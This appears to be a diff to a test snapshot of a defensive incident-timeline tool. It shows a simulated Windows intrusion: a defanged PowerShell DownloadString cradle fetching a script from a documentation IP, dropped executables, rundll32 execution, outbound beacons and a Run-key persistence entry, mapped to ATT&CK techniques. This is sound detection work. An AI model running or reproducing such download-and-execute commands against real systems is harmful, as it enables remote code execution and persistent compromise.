@@ -21,12 +21,14 @@ Net.WebClient).DownloadString('hxxp[://]203[.]0[.]113[.]10/a.ps1')
      7  10:02:07Z    powershell.exe resolved dl.example
      8  10:02:08Z  ! powershell.exe → 203.0.113.10:80/tcp (dl.example) [GR-001]  T1204.002
      9  10:02:10Z    powershell.exe wrote C:\Users\Public\upd.exe
+        ↪ dropped file runs later as S2 (exact match: c:\users\public\upd.exe)
     10  10:02:11Z    powershell.exe wrote C:\Users\Public\stage.dll
     11  10:02:20Z    powershell.exe spawned rundll32.exe rundll32.exe C:\Users\Public\stage.dll,Start
     12  10:02:30Z  ! rundll32.exe → 198.51.100.20:443/tcp (cdn.example) [GR-001, NET-001]  T1204.002
    ── Persistence ──
     13  10:02:40Z  ! Registry Run key set: 
 HKU\S-1-5-21-3623811015-3361044348-30300820-1013\Software\Microsoft\Windows\CurrentVersion\Run\Updater  T1547.001
+        ↪ fires later as S2 (exact match: c:\users\public\upd.exe)
  Scope       1 user · 5 processes · 2 files (2 executable) · 1 persistence key · 2 destinations
  Review      verify 5 processes · review 1 persistence key · review 2 files · hunt 2 destinations
  Persistence Registry Run key set → 
